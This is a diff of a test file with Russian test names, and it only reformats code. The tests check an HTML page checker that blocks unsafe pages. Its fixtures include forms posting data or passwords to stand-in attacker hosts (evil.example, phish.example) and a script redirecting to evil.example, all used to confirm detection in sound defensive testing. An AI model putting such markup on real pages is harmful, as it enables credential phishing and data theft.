@@ -32,17 +32,21 @@ describe('checkHtmlPage: чистая страница', () => {
 
 describe('checkHtmlPage: формы на сторонние адреса (ТЗ §3.8)', () => {
   it('блокирует форму с внешним action', () => {
-    const html = '<form action="https://evil.example/collect" method="post"><input name="a"></form>';
+    const html =
+      '<form action="https://evil.example/collect" method="post"><input name="a"></form>';
     const result = checkHtmlPage(html, OPTS);
     expect(result.status).toBe('blocked');
     expect(result.reasons[0]).toMatchObject({ code: 'external_form_action', severity: 'blocked' });
   });
 
   it('блокирует парольный ввод в форме на внешний хост', () => {
-    const html = '<form action="https://phish.example/login"><input type="password" name="p"></form>';
+    const html =
+      '<form action="https://phish.example/login"><input type="password" name="p"></form>';
     const result = checkHtmlPage(html, OPTS);
     expect(result.status).toBe('blocked');
-    expect(codes(html)).toEqual(expect.arrayContaining(['external_form_action', 'password_form_external']));
+    expect(codes(html)).toEqual(
+      expect.arrayContaining(['external_form_action', 'password_form_external']),
+    );
   });
 
   it('пропускает пароль в форме на свой домен (подозрительно, но не блок)', () => {
@@ -70,7 +74,9 @@ describe('checkHtmlPage: автоперенаправления (ТЗ §3.8)', (
   });
 
   it('блокирует location.replace', () => {
-    expect(codes('<script>location.replace("https://evil.example")</script>')).toContain('auto_redirect');
+    expect(codes('<script>location.replace("https://evil.example")</script>')).toContain(
+      'auto_redirect',
+    );
   });
 });
 
@@ -106,7 +112,11 @@ describe('checkHtmlPage: подозрительные ссылки и скрип
 
 describe('HtmlPageSaveSchema', () => {
   it('принимает код с заметкой и флагом публикации', () => {
-    const parsed = HtmlPageSaveSchema.parse({ html: '<h1>ok</h1>', note: 'черновик', published: true });
+    const parsed = HtmlPageSaveSchema.parse({
+      html: '<h1>ok</h1>',
+      note: 'черновик',
+      published: true,
+    });
     expect(parsed).toMatchObject({ note: 'черновик', published: true });
   });
 
